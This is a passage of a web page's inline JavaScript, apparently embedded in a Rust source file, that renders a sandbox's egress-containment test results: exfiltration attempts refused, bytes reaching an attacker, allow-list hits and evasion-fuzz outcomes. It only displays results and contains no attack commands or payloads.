    const ok = r.contained!==false && !/^(NOT|ERROR)/.test(r.verdict||'');
    $('verdict').innerHTML =
      '<div class="verdict '+(ok?'mit':'vuln')+'"><span class="ico">'+(ok?'✓':'⚠')+'</span><div>'+esc(r.verdict||r.error||'no verdict')+'</div></div>';
    const s=[];
    if(r.exfil_attempts){
      s.push(stat('bad',  r.exfil_attempts, 'exfiltration attempts made'));
      s.push(stat('good', r.exfil_refused,  'refused by the runtime'));
      s.push(stat(r.bytes_delivered_to_attacker?'bad':'good', r.bytes_delivered_to_attacker, 'bytes that reached the attacker'));
    }
    if(r.allowed_attempts){ s.push(stat(r.allowed_delivered===r.allowed_attempts?'good':'bad', r.allowed_delivered+' / '+r.allowed_attempts, 'delivered to the allow-listed sink')); }
    if(r.fuzz){ s.push(stat(r.fuzz.escaped?'bad':'good', r.fuzz.escaped+' / '+r.fuzz.variants_tried, 'evasion variants escaped')); setFuzzLine(r.fuzz); }
    $('stats').innerHTML = s.join('');

    const rows=(r.attempts||[]).map(a=>{
      let what = esc(a.bytes_offered)+' bytes'+(a.workspace_attached?' · logs + workspace':' · logs only');
      let dest = esc(a.destination);
      if(a.injected_by){ dest += '<div class="inj">hijacked by: '+esc(a.injected_by)+'</div>'; }
      return '<tr><td class="dest">'+dest+'</td><td>'+what+'</td><td>'+answer(a)+'</td><td>'+tag(a, a.hijacked)+'</td></tr>';
    }).join('');
    $('table').innerHTML = rows ?
      '<table><thead><tr><th>the shipper POSTs to</th><th>offering</th><th>the runtime\'s answer</th><th>result</th></tr></thead><tbody>'+rows+'</tbody></table>' : '';
  }

  function setFuzzLine(f){
    $('fuzztext').innerHTML = '<span class="n'+(f.escaped?' bad':'')+'">'+esc(f.line)+'</span> · '+
      esc(f.denied_by_policy)+' refused by the allow-list · '+esc(f.rejected_as_malformed)+' rejected as malformed · '+
      'control '+(f.control_connected===f.control_tried?'connected (200)':'did NOT connect');
  }

  function renderFuzz(f){
    out.style.display='block';
    setFuzzLine(f);
    const ok = f.escaped===0;
    $('verdict').innerHTML = '<div class="verdict '+(ok?'mit':'vuln')+'"><span class="ico">'+(ok?'✓':'⚠')+'</span><div>'+
      (ok?'MITIGATED: ':'NOT CONTAINED: ')+esc(f.line)+'.</div></div>';
    $('stats').innerHTML = [
      stat('bad',  f.variants_tried, 'variants tried'),
      stat(ok?'good':'bad', f.escaped, 'escaped the allow-list'),
      stat('good', f.denied_by_policy, 'refused by the allow-list'),
      stat('good', f.rejected_as_malformed, 'rejected as malformed'),
    ].join('');
    const rows=(f.results||[]).map(a=>{
      const hostile = a["class"]==='attacker'||a["class"]==='confusable'||a["class"]==='ssrf';
      return '<tr><td>'+esc(a["class"])+'</td><td>'+esc(a.technique)+'</td><td class="dest" title="'+esc(a.note)+'">'+vis(a.authority)+'</td><td>'+answer(a)+'</td><td>'+tag(a, hostile)+'</td></tr>';
    }).join('');
    $('table').innerHTML = '<div class="scroll"><table><thead><tr><th>class</th><th>technique</th><th>authority sent</th><th>the runtime\'s answer</th><th>result</th></tr></thead><tbody>'+rows+'</tbody></table></div>';
  }

  // The one-line fuzz result, live from this deployment, on every page load.
  fetch('/run?mode=fuzz').then(r=>r.json()).then(r=>{ if(r.fuzz) setFuzzLine(r.fuzz); })
    .catch(e=>{ $('fuzztext').textContent='could not run: '+e; });

  // /#exfil, /#domain, /#allowed, /#fuzz and /#all press that button on load.
  const auto = {'#exfil':'runExfil','#domain':'runDomain','#allowed':'runAllowed','#fuzz':'runFuzz','#all':'runAll'}[location.hash];
  if(auto) send(auto);
</script>
</body>
</html>
"###;
